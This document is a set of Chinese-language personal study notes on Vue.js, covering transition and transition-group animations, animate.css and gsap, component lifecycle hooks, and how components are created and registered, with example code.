```html
<script setup lang="ts">

import { nextTick, onMounted, reactive, ref, toRef, watch, watchEffect } from 'vue';

import "animate.css"

// 定义一组列表
let list = reactive<number[]>([1,2,3,4,5,6])

const push = () => {
  list.push(list.length + 1)
}

const pop = () => {
  list.pop()
}
 
</script>

<template>
  <div class="content">
    <div class="button-area">
      <button @click="push">push</button>&emsp;
      <button @click="pop">pop</button>
    </div>
    
    <div class="wraps">
      <!-- 包裹整个的列表 -->
      <transition-group
        leave-active-class="animate__animated animate__bounceOut"
        enter-active-class="animate__animated animate__bounceOut"
      >
        <!-- 使用transition-group一定要加上key -->
        <div class="item" :key="index" v-for="(item,index) of list">
          {{item}}
        </div>
      </transition-group>
    </div>
  </div>
</template>

```

<br>

### ``<transition-group>``列表的移动过渡
上面我们完成的过渡都是通过 if show 添加 删除 等逻辑实现的元素变化 从而产生的过渡

这个部分我们通过改变位置来实现过渡

```
vue内部就是基于这个动画库实现的
aerotwist.com/blog/the-hack-is-back/
```

<br>

### 要点:
标签属性: move-class="" 我们可以指定平移的时候的类名 

<br>

这个案例中我们就是指定了平移时的类名
```html
<transition-group
  tag="div"
  class="wraps"
  move-class="move"
>

<style>
.move {
  transition: all 1s;
}
</style>
```

<br>

### 示例:
```html
<script setup lang="ts">
import { nextTick, onMounted, reactive, ref, toRef, watch, watchEffect } from 'vue';
import "animate.css"

/*
  我们要组织好一个矩阵 9 * 9 
  1 2 3 4 5 6 7 8 9
  1 2 3 4 5 6 7 8 9
  1 2 3 4 5 6 7 8 9
  ...

  我们可以通过下面的操作来完成

  new Array(81) 该方式创建的数组 成员都是空的
    [emtry x 81]

  Array.apply(null, {length: 81} as number[])
  该方式创建的数组 有81个undefined 帮我们初始化好了81个成员 相当于我们用undefined占好位置了
*/

// apply的第二个参数本来应该是数组 但是我们传递一个对象 9 * 9 = 81 但是ts监测第二个参数只能是数组 我们断言下
// 然后通过map方法确定每一个成员 index % 9 相当于 0 - 9
let list = reactive(Array.apply(null, {length: 81} as number[]).map((_, index) => ({id:index, number: (index % 9) + 1})))

// 随机函数
const random = () => {
  // 先进行打乱排序
  let arr = list.sort(() => Math.random() - 0.5).slice(0, 81)

  // 自己实现的打乱数组中的排序
  list.length = 0
  
  // 将打乱后的结构push到list中
  list.push(...arr)


  /*
    也可以使用 lodash 来做 _.shuffle(collection)
    npm i lodash -S
    npm i @types/lodash -D

    import _ from "lodash"

    list = _.shuffle(list)
  */
}
 
</script>

<template>
  <div class="content">

    <div>
      <button @click="random">随机</button>
    </div>

    <!-- 包裹整个的列表 -->
    <!-- 
      move-class: 平移的动画
     -->
    <transition-group
      tag="div"
      class="wraps"
      move-class="move"
    >
      <div 
        class="items" 
        :key="item.id" 
        v-for="(item,index) of list"
      >
        {{item.number}}
      </div>
    </transition-group>

  </div>
</template>

<style scoped>

.move {
  transition: all 1s;
}

button {
  background-color: #e9e9e9;
}

.wraps {
  display: flex;
  flex-wrap: wrap;
  width: calc(25px * 10 + 9px);
}

.items {
  width: 25px;
  height:25px;
  border: 1px solid #212121;
} 

</style>
```

<br>

### ``<transition-group>``数字的过渡效果
```html
<script setup lang="ts">
import { nextTick, onMounted, reactive, ref, toRef, watch, watchEffect } from 'vue';
import "animate.css"

import { gsap } from "gsap";

const num = reactive({
  current: 0,
  tweenedNumber: 0
})

watch(() => num.current, (n) => {
  // 参数1:过渡的对象 参数2: 配置项 配置项可以过渡对象中的属性
  gsap.to(num, {
    duration: 1,
    // 当 num.current 发生变化的时候 将新值赋值给tweenedNumber
    tweenedNumber: n,
  })
})

</script>

<template>
  <div>
    <input v-model="num.current" type="number" step="20">
    <div>
      {{num}}
    </div>
  </div>
</template>
```

<br><br>

## 集成第三方过渡动画: animate.css
上面的例子中所有的动画都是我们自己写的 比如使用了animation 或者 transition来实现的动画效果  
但是git上有很多已经成型的第三方库 

```s
https://animate.style/
```

<br>

### 安装:
```
npm install animate.css --save
```

<br>

### 引入:
比如入口文件 或者 某个组件内引入
```
import "animate.css"
```

<br>

### 复制animate库中的类名
页面的右侧有一个预览列表 上面每一个item都有一个复制的标签 我们点击复制 就能复制到该效果的类名

<br>

**在transition组件中 通过以下的标签属性指定我们上面复制的类名**

animate3中下面的写法没有问题 但是aninmate4中则不行
```html
<transition
  leave-active-class="animate__fadeOut"
  enter-active-class="animate__fadeIn"
>
  <div v-if="flag" class="box">内容</div>
</transition>
```

<br>

在animate4中类名的前面要加上 animate 特有的前缀
```html
<transition
  leave-active-class="animate__animated animate__fadeOut"
  enter-active-class="animate__animated animate__fadeIn"
>
  <div v-if="flag" class="box">内容</div>
</transition>
```

<br>

上面在animate4中需要加上前缀 我们可以尝试下面的方式加前缀 我没有试验哈 **但我觉得不好用哈哈**

**``<transition name='animate__animated animate__bounce'>``**  
使用 name 属性来加类名前缀

<br>

```html
<transition
  name='animate__animated animate__bounce'
  enter-active-class='找个好玩的动画类名'
  leave-active-class='找个好玩的动画类名'
>
```

<br>

### transition 的标签属性

**<font color="#C2185B">name</font>**  
string  

用于自动生成 CSS 过渡类名, 例如  ``<transition name="fade">`` 则类名自动扩展为 .fade-enter  

默认为 v-

<br>

**<font color="#C2185B">appear</font>**  
boolean  
是否在初始渲染时使用过渡。默认为 false

通过这个属性可以设置初始节点过渡 就是页面加载完成就开始动画 对应3个状态

```html
<!-- 
  通过定义下面的3种状态来控制 初始动画的效果 
-->
<transition
  appear: true

  appear-from-class=""
  appear-active-class=""
  appear-to-class=""
>
```

<br>

**<font color="#C2185B">type</font>**  
string  
可选值: transition | animation

默认 Vue.js 将自动检测出持续时间长的为过渡事件类型。

<br>

**<font color="#C2185B">duration</font>**  
``number | { enter: number, leave: number }`` 

指定过渡的持续时间。比如动画效果必须50ms内执行完毕

默认情况下, Vue 会等待过渡所在根元素的第一个  transitionend 或 animationend 事件。

<br>

- **<font color="#C2185B">enter-class</font>**  
- **<font color="#C2185B">leave-class</font>**  

<br>

- **<font color="#C2185B">enter-to-class</font>**  
- **<font color="#C2185B">leave-to-class</font>**   

<br>

- **<font color="#C2185B">enter-active-class</font>**  
- **<font color="#C2185B">leave-active-class</font>**  

用来代替vue默认类名 指定我们自定义类名

<br>

之前我们要是想使用过渡的话 必须要使用 vue 给我们预定的类名 xxx-enter-active
```css
.hello-enter-active { }
```

<br>

现在我们可以通过 上面的两个标签属性 来修改vue指定的类名 比如  
```html
<transition 
enter-active-class: "e-active">

<!-- 上面修改为 e-active 下面我们就可以使用e-active来代替原先的 .hello-enter-active 才能完成的事情 -->
<style>
  .e-active { }
</style>
```

这个功能一般我们都会搭配 animate.css 库 来使用 因为库里有很多的自定义名

<br>

### 总结:
如果我们想用 动画写 那么使用 v-enter-acitve 和 v-leave-active 就够用了  
如果我们想用 过渡写 那么就要分别设置from to的类名

<br>

### transition的生命周期
该组件有8个生命周期

<br>

**场景:**  
有的时候css满足不了 需要js来计算 所以提供了这样的解决方案

这些生命周期钩子 可以 配合 js动画库 gsap 来使用
```js
// 对应 enter-from: 进入之前
@before-enter="beforeEnter"

// 对应 enter-active: 过程
@enter="enter"

// 对应 enter-to: 离开
@after-enter="afterEnter"

// 显示过渡打断时候的回调
@enter-cancelled="enterCancelled"

// 对应 leave-from
@before-leave="beforeLeave"

// 对应leave-active
@leave="leave"

// 对应leave-to
@after-leave="afterLeave"

// 离开过渡打断时候的回调
@leave-cancelled (v-show only)="leaveCancelled"


// 不知道啥作用
@before-appear=""
@appear=""
@after-appear=""
@appear-cancelled=""
```

<br>

上面对应的处理函数会接收到参数 我们拿一个举例子
```html
<transition @before-enter="beforeEnter">

<script>
  // 每一个钩子都会接收 el 参数
  consnt beforeEnter = (el: Element) => {

  }

  // active 过程的周期里面额外有一个参数 done 它是一个函数 我们可以通过 done() 来确定什么时候走下一个逻辑
  consnt enter = (el: Element, done:Function) => {
    // 动画过渡3秒后完成 不加done 直接会进入下一个钩子
    setTimeout(() => {
      done()
    }, 3000)
  }

  consnt afterEnter = (el: Element) => {
    // 因为上面3秒后才调用的done 所以这里的逻辑会等3秒之后再执行
    console.log("过渡完成")
  }
</script>
```

<br><br>

# 生命周期:
生命周期回调函数 生命周期函数 生命周期钩子 vue在关键时刻帮我们调用的一些特殊名称的函数

生命周期函数的书写位置和el methods等同级

vue发现了模板开始解析 生成虚拟DOM 然后转成真实DOM 然后挂载到页面上

生命周期函数里面的this是vm 或 组件的实例对象

<br>

### 挂载流程:
**初始化部分:**  该阶段会执行1次
```
new Vue()  --  
beforeCreate  --  created  --  beforeMount  --  mounted
```

<br>

**更新部分:**  该阶段会执行N次  

在初始化阶段是没有新旧的 *虚拟DOM比较* 的 但是 *在更新的时候就有* 这个环节
```
beforeUpdate  --  updated
```

<br>

**销毁部分:**   
当我们调用 vm.$destroy() 的时候进入销毁流程 此时能访问到数据和事件 但是对数据的修改不再会触发更新了

完全效果一个示例 清理它与其它组件的链接 解绑它的全部指令以及自定义事件的监听器 注意销毁后原生的dom事件还在  

当vm被销毁后 页面的数据还是有的 只是vm走了成果还在 只不过dom没人帮我们管理了
```js 
this.$destroy()
```

<br>

### 流程图:

```js
                     new Vue()
                        ↓
              Init Event & Lifecycle
        初始化: 生命周期 事件 但数据代理还未开始
(此阶段在制定规则 比如生命周期有多少个 都叫什么 什么时候调用他们)

                        ↓

                  beforeCreate
                  (生命周期函数)
  创建之前 此时 无法通过vm访问到data中的数据 methods中的方法 也就是说它是在数据代理 和 数据监测创建之前
  
                        ↓

          Init Injections & reactivity
              初始化: 数据监测 数据代理

                        ↓

                      created
                    (生命周期函数)
创建完毕 此时 可以通过vm访问到data中的数据 methods中配置的方法

                        ↓

      根据我们传入的配置开始判断 以什么作为模板来解析
(有没有传递el配置项 如果传递了同时没有传递template配置项 那么<div id='root'>这个整体的区域就作为模板) 在此阶段Vue开始解析模板 生成虚拟DOM(内存中) 注意页面还不能显示解析好的内容

                在这步里已经出现了虚拟DOM
                
                        ↓

                    beforeMount
                    (生命周期函数)
此时: 1 页面呈现的是 未经Vue编译的DOM结构 2 所有对DOM的操作最终都不奏效 Vue已经把模板解析好 但是还没有网页面上放
        
                        ↓

        create vm $el and replace el with it
          将内存中的虚拟DOM转为真实的DOM插入页面
          
                        ↓

                      mounted
                    (生命周期函数)
此时: 1 页面中呈现的是经过vue编译的DOM 2 对DOM的操作均有效(尽可能避免)至此初始化过程结束

一般在此进行 开启定时器 发送网络请求 订阅消息 绑定自定义事件 等 初始化操作


    // 如果我们修改了数据的话 会进入更新流程 然后进入销毁流程 // 
                        ↓

                    beforeUpdate
                    (生命周期函数)
    此时: 数据是新的 但页面是旧的 即: 页面尚未和数据保持同步
    
                        ↓

          Virtual DOM re-render and patch 
根据新数据 生成新的虚拟DOM 随后与旧的虚拟DOM进行比较 最终完成页面的更新 即:  完成了 Model - > View的更新

                        ↓

                      Update
                    (生命周期函数)
    此时: 数据是新的 页面也是新的 即:  页面和数据保持同步
    
                        ↓

    // 当vm.destroy() 方法被调用的时候 会入销毁流程 // 
                        ↓

                  beforeDestroy
                  (生命周期函数)

      注意 在此阶段对数据的操作 页面都不会再更新了

此时: vm中所有的 data methods 指令等等都处于可用状态 马上要执行销毁过程 一般在此阶段 关闭定时器 取消订阅消息 解绑自定义事件等收尾动作

                        ↓

                    destroyed
                   (生命周期函数)
```

<br>

### **<font color="#C2185B">beforeCreate(数据代理 监测 创建前)</font>**  
data 和 el均未初始化, 值为undefined

<br>

### **<font color="#C2185B">created(数据代理 监测 创建后)</font>**  
data、mounted、watch等已经完成初始化, 但是 el dom树还未挂载

当组件被创建出来之后, 会回调的一个生命周期函数, 一旦这个组件被创建出来了就会回调这个函数

<br>

### **<font color="#C2185B">beforeMount(载入前)</font>**  
data 和 el 已经完成初始化, 但此时el并没有渲染进数据, 只是虚拟DOM节点

完成el和data初始化 在挂载开始之前被调用 可以发送数据请求 在服务器端渲染期间不会被调用

<br>

### **<font color="#C2185B">mounted(组件模板内容被挂载到DOM的时候, 执行该回调)</font>**  
el dom树已经渲染完成并挂载到实例上

Vue完成模板的解析并把初始的真实的DOM元素放入页面后(挂载完毕)调用mounted生命周期函数  
该函数只调用一次 初始的真实DOM挂载 以后再发生变化那就叫做更新了

<br>

**扩展部分:**  
我一直认为 mounted 会等所有的资源加载完毕后的回调 但是今天发现在mounted方法中去获取图片资源的宽度和高度的时候 可能获取不到 缓存之后获取才会变成正常的值

也就是说 在 mounted 里面图片资源的请求已经发送完成 但是图片资源的缓存还并未响应回来 所以在 mounted中可以获取到图片 但是并不能获取到实际的资源数据  

如果要对图片资源进行操作 应该在 img 标签中使用 load 事件  

<br>

**mounted里面获取不到元素的真实高度:**  
我们可以在 mounted 里面使用 setTimeout 来获取试试

<br>

### **<font color="#C2185B">beforeUpdate(更新前)</font>**  
data 数据更新前调用

数据更新时调用 挂载完成之前访问现有DOM 比如手动移除已添加的事件监听器 也可以进一步修改数据  

在服务器渲染期间不会被调用 只有初次渲染会在服务端调用

<br>

### **<font color="#C2185B">updated(页面刷新, 执行该回调)</font>**  
data 数据更新后调用

当页面发生更新的时候会调用这个函数

比如我们的组件data中有message数据, 我把这个message数据放到组件的模板里面{{message}}, 因为这个是动态的, 假如data中的数据发生改变的时候, 页面就会刷新为了显示最新的数据 只要界面一更新完的时候就会执行这个updated()函数

<br>

### **<font color="#C2185B">this.$destroy()</font>**  
自杀 销毁组件 开发的时候很少这么干 开发的时候都是他杀没的

<br>

### **<font color="#C2185B">beforeDestroy(销毁前)</font>**  
组件销毁前调用 （常用于销毁监听事件）

在这里一般做一些收尾的工作 比如清除定时器 下面处于组件销毁的阶段, 该阶段没有数据绑定 没有交互了  

同时在这个逻辑里面将timer设置为null

服务器端渲染期间不会被调用
```js 
created() {
  this.count()
},

methods: {
  count() {
    this.timer = setInterval(() => {
      this.num++
      console.log(this.num)
    }, 1000)
  }
},

beforeDestroy() {
  clearInterval(this.timer)
  this.timer = null
},

destroyed() {
  console.log("我被销毁了")
},
```

<br>

### **<font color="#C2185B">destroyed(销毁后)</font>**  
组件销毁后调用 vue实例销毁后调用。

调用后 Vue实例指示的所有东西都会被解绑定 所有的事件监听器会被移除 所有的子实例也会被销毁  

服务器端渲染期间不会被调用 提示已删除

<br><br>

下面两个函数 只有该组件被保持了状态使用了 ``<keep-alive>`` 时才是有效的, 我们可以看看接下来的例子

<br><br>

### **<font color="#C2185B">activated() { ... }</font>**  
当页面处于活跃状态的时候, 执行该回调

<br>

**<font color="#C2185B">deactivated() { ... }</font>**  
当页面不处于活跃状态的时候, 执行该回调

<br>

### 是否能获得节点
|生命周期|是否获取dom节点|是否可以获取data|是否获取|methods
|:--|:--|:--|:--|:--|
|beforeCreate|否|否|否|
|created|否|是|是|
|beforeMount|否|是|是|
|mounted|是|是|是|

<br>

### **<font color="#C2185B">this.$nextTick(() => { })</font>**  
nextTick 有下一轮的意思 所以是**一次重新渲染模板之后**再执行回调的逻辑  

**当页面上元素被重新渲染之后才会执行回调中的代码**

**它会在DOM重新渲染完毕 解析完毕之后执行内部的回调** 它能确保我们得到了最新的DOM节点后 再去对节点进行操作

<br>

### 应用场景:
- 当改变数据后  
- 当改变数据后 要基于更新后的新DOM  
- 当改变数据后 要基于更新后的新DOM 进行某些操作的时候 要在nextTick所指定的回调函数中执行

<br>

### 作用:
在下一次DOM更新结束后执行其指定的回调

<br><br>

# vue 父子组件生命周期的执行顺序:
最先和最后执行的都是父组件生命周期, 子组件生命周期按照组件生命周期执行顺序在中间, 当子组件开始挂载时开始执行子组件生命周期

<br>

**组件初始化过程:**  
```
父beforeCreate -> 

  父created -> 
    父beforeMount -> 
      子beforeCreate -> 
        子created -> 
          子beforeMount -> 
            子mounted -> 

父mounted
```

<br>

**组件更新过程:**  
```
父beforeUpdate -> 
  子beforeUpdate -> 
    子updated -> 
父updated
```

<br>

**组件销毁过程:**  
```
父beforeDestroy -> 
  子beforeDestroy -> 
    子destroyed -> 
父destroyed
```

<br>

### 注意事项:
1. 所有的生命周期钩子自动绑定 this上下文到实例中

2. 父子组件的生命周期都是同步执行的, 如果在父组件中进行异步接口请求, 并用于子组件渲染, 建议在子组件的标签加上 v-if="传递的数据", 或者还可以在子组件中使用watch监听

3. 虽然updated函数会在数据变化时被触发, 但却不能准确的判断是那个属性值被改变, 所以在实际情况中用computed或watch函数来监听属性的变化

4. 在使用vue-router时有时需要使用keep-alive来缓存组件状态, **这个时候 created 等组件初始化钩子就不会被重复调用了, 只能触发 activated、deactivated这两个keep-alive专属钩子**


<br>

### 总结: 常用的生命周期钩子
1. mounted:  发送ajax请求 启动定时器 绑定自定义事件 订阅消息等初始化动作

2. beforeDestroy:  清楚定时器 解绑自定义事件 取消订阅消息等 收尾工作

<br>

**关于销毁vue实例:**   
1. 销毁后借助vue开发者工具看不懂任何信息
2.  销毁后自定义事件会失效 但原生dom事件依然有效
3. 一般不会在beforeDestroy操作数据 因为几遍操作数据 也不会再触发更新流程了

<br><br>

# 什么是组件化
人面对复杂问题的处理方式 任何一个人处理信息的逻辑能力都是有限的, 所以当面对一个非常复杂的问题的时候, 我们不太可能一次性搞定一大堆的内容

但是 我们人有一种天生的能力, 就是将问题进行拆解, 如果将一个复杂的问题, 拆分成很多个可以处理的小问题, 再将其放在整体当中, 你会发现大的问题也会迎刃而解

<br>

### 组件化的思想
如果我们将一个页面中所有的处理逻辑全部放在一起, 处理起来就会变得非常的复杂, 而且不利于后续的管理以及扩展

但如果, 我们将一个页面拆分成一个个小的功能块, 每个功能块完成属于自己这部分独立的功能, 那么之后整个页面的管理和维护就变得非常的容易了

<br>

### 组件的定义
实现应用中局部功能代码和资源的集合

每一个部分都有自己的html css js文件 形成属于这一个部分的结构样式交互方便复用

<br><br>

## 组件化编码的流程

### 拆分组件:
- 做之前先分析, 页面上我们应该划分几个组件来开发
- 按照组件 将原页面对应的dom部分 粘贴到 组件的template中
- 还要将css样式也按组件来粘贴进去

<br>

### 静态组件:
静态组件显示在页面 数据是固定的 没有交互

<br>

### 动态组件:
动态组件两个方面是动态:
1. 动态显示
2. 交互

<br>

当有很多组件的时候, 数据放在哪个组件里面, 那就要看这个数据是某些组件要用到还是某个组件中要用到 如果是某些组件要用到 那就放在公共的父组件里面

<br>

**注意:**   
数据在哪个组件, 更新数据的行为(方法) 就应该定义在哪个组件

<br><br>

# 创建组件
组件的创建分为两种形式
1. 非单文件组件
2. 单文件组件

<br>

### 非单文件组件
**定义:**   
一个文件中包含有n个组件 1个html里面有4个组件

<br>

### 单文件组件
**定义:**   
一个.vue文件里面就是一个组件

<br><br>

## 非单文件组件的书写方式
就是一个html文件里面定义好多个组件 互相嵌套使用

比如我们一个html页面中有两个组件 那么我们就需要在这个html文件中创建两个组件是么? vue中普通创建组件要分为3步

- 创建组件 **Vue.extend**
- 注册组件 **components / Vue.component**
- 使用组件

<br>

### **<font color="#C2185B">创建组件: Vue.extend({配置对象})</font>**
Vue.extend() 该方法是创建组件

<br>

**参数:**  
配置对象是用于配置该组件相关内容的 其配置项的内容和new Vue的时候基本一致

<br>

**啥不一致呢?**  
1. 定义组件时不要写el配置项   
因为组件是vm(vue实例)下面的所有组件被vm管理 vm来决定整个组件为哪个容器服务
  
2. 组件内部的data配置项要写成一个函数 不要写对象的形式 如果组件中使用了对象形式的data 3组件都引用了这个data当一个修改的时候回影响到其它的组件
```
function data() {
  return { a: 1 }
}

const c = data()    // 这样c会有一个全新的对象
const d = data()    // 这样d也会有一个全新的对象
```
  
3. 使用 template 配置项 在组件内部定义模板

<br>

**还有一种用法参考 全局挂载组件:**  
该方法返回的是一个 构造器, 我们需要new构造器 才会生成对应的组件
```js
let Compoment = Vue.extend(组件)
let vm = new Compoment({配置对象})
```

<br>

### **<font color="#C2185B">components配置项: 注册局部组件</font>**
在vm上使用新的配置项 components 它的类型是一组组的kv

我们在创建组件的时候用于接收的变量并不是组件名 真正的组件名是在components里面定义的 当然你也可以接收名 和 组件名起一样的

接收明只是用于找到该组件 并不是 给该组件起名字

```js 
components: {
  组件名:  创建组件时候定义的接收变量
}
```

<br>

### **<font color="#C2185B">Vue.component('组件名', '组件在哪') 注册全局组件</font>**
全局定义的组件 全局可用

<br>

**参数1:**   
组件名就是我们以后要使用的组件标签

<br>

**参数2:**   
组件在哪就是我们创建组件的时候 定义的接收变量 也可以直接将创建组件的配置对象填写到参数2的位置
```js 
// 省略 Vue.extents() 创建组件了
Vue.component('student', {组件的配置项})
Vue.component('student', Student组件变量)
```

<br>

### 使用组件:
使用组件标签的形式在div#root里面使用
```js 
<Student></Student>
```

<br>

### 示例:
```html
<div id="root">
  <!-- 使用 组件标签 -->
  <Student></Student>
</div>

<script>

// 在学生组件中 定义template 和 data
const Student = Vue.extend({
  data() {
    return {
      name: 'sam',
      age: 18
    }
  },

  // 多级结构要使用根标签包裹
  template: `
  <div>
    <h3>学生组件</h3>
    <h3>{{name}}</h3>
    <h3>{{age}}</h3>
  </div>
  `
})


// 在Vue实例中注册组件
new Vue({
  el: '#root',
  components: {
    Student
  }
})
</script>
```

<br>

### 组件当中需要注意的点:

**组件名:**   
如果组件名是一个单词组成 可以使用纯小写字母 或者 纯大写字母的形式  
```js
components:{ student: 创建组件时定义的接收组件的变量}
```

<br>

**如果组件名是多个单词组件:**  
全部小写 多个单词之间使用 - 来连接  my-student    
```s
components:{ 'my-student': 创建组件时定义的接收组件的变量}
```

<br>

**多个单词的首字母全部大写 (仅在脚手架环境里面才可以使用该方式):**  
```s
components:{ MyStudent: 创建组件时定义的接收组件的变量}
```

<br>

**不要使用html标签名作为组件名**

<br>

**组件中的name配置项是在开发者工具中呈现的名字**  
该怎么注册怎么注册 name配置项只是在开发者工具上使用的名字

<br>

**组件标签:**  
可以写自闭合标签的形式 但是必须保证在脚手架的环境下 普通引入vue.js文件的环境不能使用该形式

<br><br>

# 注册组件的语法糖
在上面注册组件的方式, 可能会有些繁琐 
```js
// 先使用 Vue.extend({}) 创建组件
let component = Vue.extend({
  template: `<div>hello</div>`,
  data() {
    return {
      flag: true
    }
  }
})

// 注册组件
Vue.component("my-con", component)
```

<br>

Vue为了简化这个过程, **提供了注册的语法糖** 主要是省去了调用 Vue.extend()的步骤, 而是可以直接使用一个对象来代替

我们可以把在extend()方法中传递的对象里面的内容 直接作为component的第二个参数
```js
// 第2个参数相当于 Vue.extend() 里面的配置对象
Vue.component('组件名', {
  template:`
    内容...
  `
});
```

<br>

### 局部注册组件的语法糖
同理 当我们使用局部注册的方式的时候 也可以使用上面的方式
```js
export default {
  name: "app",
  data() {
    return {
      flag: true
    }
  },

  // 这里
  components: {
    '组件名': {
      template:`
        内容...
      `
    }
  }
}
```

<br><br>

# 组件的嵌套 (父组件 和 子组件)
在哪个组件中注册的 就去那个结构当中写组件标签

<br>

**在一个组件(A)中注册另一个组件(B) 它们的关系就是父子组件**  
子组件可以在父组件的 template 中使用, 这样在被管理区域内使用父组件的标签, 会带上子组件的内容 

<br>

### 父组件内注册子组件的方式
在创建 父组件 时, 在它的配置对象中使用 components 配置项
```js 
const son = Vue.extend({
  template:`
    <div>
      <h2>我是子组件的标题</h2>
      <h4>我是子组件的内容~~~</h4>
    </div>
  `
})

const fatherC = Vue.extend({
  template:`
    <div>
      <h2>我是父组件的标题</h2>
      <h4>我是父组件的内容~~~</h4>
    </div>
  `,

  // 在父组件中注册子组件
  components: {
    'cpn-son':son
  }
})
```

<br>

### 注意要点
1. 先创建子组件构造器, 再创建父组件构造器 也就是说父组件要在下面
2. 组件构造器的template中必须有一个根元素(也就是必须是一个div)
3. 在父组件中注册的子组件, 只能通过父组件来调用 不能单独调用(要想单独调用要在全局 或 局部进行注册)
4. 子组件只能在父组件中被识别

<br>

### 代码部分:
```html
<div id="app">

  <!-- 4. 在被管理区域内使用父组件(自动调用了子组件的内容) -->
  <cpn-father></cpn-father>
</div>

<script>
// 1. 先创建子组件
const son = Vue.extend({
  template:`
    <div>
      <h2>我是子组件中的标题</h2>
      <h4>我是子组件中的内容~~~</h4>
    </div>
  `
})


// 2. 在创建父组件, 并在父组件中注册子组件
const father = Vue.extend({
  template:`
    <div>
      <h2>我是父组件中的标题</h2>
      <h4>我是父组件中的内容~~~</h4>

      <cpn-son></cpn-son>
    </div>
  `,
  components: {
    'cpn-son':son
  }
})


// 3. 将父组件在vue实例中注册
let app = new Vue({
  el:'#app',
  components: {
    'cpn-father': father
  }
})
</script>


<!-- 不能直接使用 子组件 的演示 -->
<div id='app'>
  <cpn-father></cpn-father>

  <!-- 不能使用 因为son组件是在father组件中定义的 -->
  <cpn-son></cpn-son>        
</div>
```

<br>

### 原因:
在被管理区域内使用father组件的时候, father组件中template中的内容就已经被编译好了(里面是father的完整内容+son的完整内容)

vue会先解析father中的template中的内容 在解析模板的过程中就发现了有cpn-son的组件标签, 这时候vue就会优先在自己的组件内部去找有没有被注册过 

如果有找到 vue就会将cpn-son对应的模板里的内容 直接拿到父组件的模板内做一个粘贴(把内容替换掉cpn-son的标签), 

如果自己组件内部没有它会去全局里面找, 找到也会做相对应的替换, 因为spn-son根本就没有经过vue实例对象, 所以vue实例对象压根就不知道cpn-son的存在

所以这时候我们在被管理区域使用cpn-son的话 就会报错因为vue实例对象根本不知道cpn-son

<br><br>

# VueComponent构造函数
这节里面我们了解一下组件是什么样的数据类型
```js 
const Student = Vue.extend({
  data() {
    return { name: 'sam', age: 18 }
  },
  template: `
  <div>
    <h3>学生组件</h3>
    <h3>{{name}}</h3>
    <h3>{{age}}</h3>
  </div>
    
  `
})

new Vue({
  el: '#root', components: { Student }
})
```

<br>

我们尝试的看下 ``console.log(Student)`` 发现 它的本质就是一个构造函数 那既然是一个构造函数 那么当我们使组件的时候 就应该在前面加一个new吧 可是我们没调用啊
```js  
// Vue组件
ƒ VueComponent (options) {
    this._init(options);
  }
```

<br>

### 总结
1. Student组件本质是一个名为VueComponent的构造函数 且不是程序员定义的 是Vue.extend生成的

2. 我们只需要写``<Student />`` vue在解析的时候就会帮我们创建Student组件的实例对象 即vue帮我们执行的 new VueComponent() 

3. 特别注意: **每次调用Vue.extend 返回的都是一个全新的VueComponent**

4. 关于this指向
```s
组件配置中:  
data函数 methods中的函数 watch中的函数 computed中的函数 他们的this均是 VueComponent实例对象

new Vue配置中:  
data函数 methods中的函数 watch中的函数 computed中的函数 他们的this均是 Vue实例对象
```

5. VueComponent实例独享 以后简称vc 也可以称之为组件实例对象 Vue的实例对象简称vm

<br><br>

# 内置关系
```
VueComponent.prototype.__proto__ === Vue.prototype
```

让组件实例对象可以访问到vue原型上的属性和方法

<br>

上面是总结 而实际上是这样的

我们new Vue 会创建出来vue的实例对象 vue的实例对象的隐式原型属性一定指向它的缔造者的显式原型属性
```js
// vue
Vue - Vue.prototype -  
                        ↘
                            Vue的原型对象
                        ↗
Vm   - Vm.__proto__ -

                                            ↖
                                              ↖
                                                ↖
// vuecomponent
vuecomponent  - Vue.prototype  
                              ↘
                                  vuecomponent的原型对象
                              ↗
Vc   - Vc.__proto__ -
```

Vue的原型对象 VueComponent的原型对象 都是对象 它们两个肯定也会有 Vc.__proto__ 指向的是object的原型对象 但是 vue 这时候做了一步

```
VueComponent.prototype.__proto__ === Vue.prototype
```

没有让组件实例的原型对象指向object的原型对象 而是 指向了vue的原型对象 让组件实例对象vc可以访问到vue原型上的属性和方法

<br><br>

# Vue里 单文件组件的书写方式
非单文件组件不好的地方就是 结构不清晰 所有的组件都放在了一个html文件内部 

同时 如果我们想给组件里面的结构添加样式的话 必须要到html文件的上方的``<style>`` 标签中书写 这样不太像组件化的逻辑

单文件组件的后缀都是以 .vue 的方式结尾的

这种 .vue 文件我们直接交给浏览器 浏览器是没办法运行的 所以要是想让浏览器认识那么我们必须对这种文件进行加工

<br>

### 加工的途径有两种:
1. webpack
2. 脚手架

这里我们在给 .vue 文件起名字的时候我们还要注意下
```js 
// 一个单词的 组件名
school.vue  /  School.vue

// 多个单词的 组件名
my-school.vue  /  MySchool.vue
```


我们创建一个 Test.vue 文件  

那么 Test.vue 文件中应该怎么写比较好呢?  我们回想一下 组件的定义 一个标准的组件应该有三个部分是么 html js css 为了迎合这三个部分 vue给我们设计了与之对应的三个标签

<br>

### 单文件组件内的结构
```html
<template>
  <!-- 组件的结构 -->
</template>


<script>
  // 组件的交互相关的代码 数据 和方法等等 我们定义的组件最终需要别的文件来引入 所以 我们这个部分应该将我们定义的组件暴露出去

  // —— 暴露的方式1
  export const Test = ...      // 分别暴露

  // —— 暴露的方式2
  const Test = ...
  export {Test}               // 统一暴露

  // —— 暴露的方式3
  extend default {直接暴露组件的配置对象}     // 默认暴露
</script>


<style>
  /* 组件的样式 */
</style>
```

<br>

### 要点:
1. 我们一般采用的是 默认暴露的方式 因为引入文件的时候方便调用者起名字

2. export default 直接暴露 组件的配置对象
```s 
正常我们创建组件的时候会使用 Vue.extend({ })

但是这个方法在我们写组件标签的时候vue会自动帮我们调用 

所以我们可以省略Vue.extend({ }) 直接默认暴露 组件的配置对象
```

3. name配置项 该配置项并不是组件的名字 但最好跟组件的名字写成一样的 该配置项是用来在开发者工具上显示的名字

<br>

大概的书写方式:
```html
<template>
  <h3>{{name}}</h3>
</template>

<script>
export default {
  name: 'Test',
  data() {
    return {
      name: 'sam'
    }
  }
}
</script>

<style scoped>
  h3 {
    padding: 5px;
    background: deepskyblue;
  }
</style>
```

<br>

### app组件
注意: 如果我们要写单文件组件的话 一定要创建一个app组件 该组件用来汇总所有的组件

1. 引入组件
2. 注册组件
3. 使用组件

```html
<template>
  <div>
    <Test />
  </div>
</template>

<script>
// App组件的作用是汇总所有的组件 所以我们要先引入组件
import Test from './Test.vue'

export default {
  name: 'App',
  components: {
    Test
  }
}
</script>

<style> </style>
```

<br>

### main.js文件:
创建入口文件  

